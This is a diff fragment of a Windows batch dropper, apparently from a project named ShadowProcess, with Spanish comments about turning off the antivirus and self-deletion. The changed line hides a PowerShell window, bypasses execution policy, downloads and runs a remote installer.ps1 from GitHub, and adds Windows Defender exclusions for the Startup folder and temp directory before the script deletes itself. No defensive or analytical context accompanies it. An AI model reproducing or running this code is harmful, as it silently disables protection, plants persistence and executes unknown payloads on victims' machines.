@@ -29,7 +29,7 @@ if '%errorlevel%' NEQ '0' (
 
 @REM Apagar el  3:)
 @REM obteniendo el installer 
-powershell powershell.exe -windowstyle hidden -ep bypass "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/installer.ps1 -OutFile installer.ps1";Add-MpPreference -ExclusionPath "%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup";Add-MpPreference -ExclusionPath "$env:temp";powershell.exe -windowstyle hidden -executionpolicy bypass -File ".\installer.ps1"
+powershell powershell.exe -windowstyle hidden -ep bypass "Invoke-WebRequest -Uri raw.githubusercontent.com/tobiasasa/ShadowProcess/main/files/installer.ps1 -OutFile installer.ps1";Add-MpPreference -ExclusionPath "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup";Add-MpPreference -ExclusionPath "$env:temp";powershell.exe -windowstyle hidden -executionpolicy bypass -File ".\installer.ps1"
 
 @REM autoeliminado
 del wget.cmd
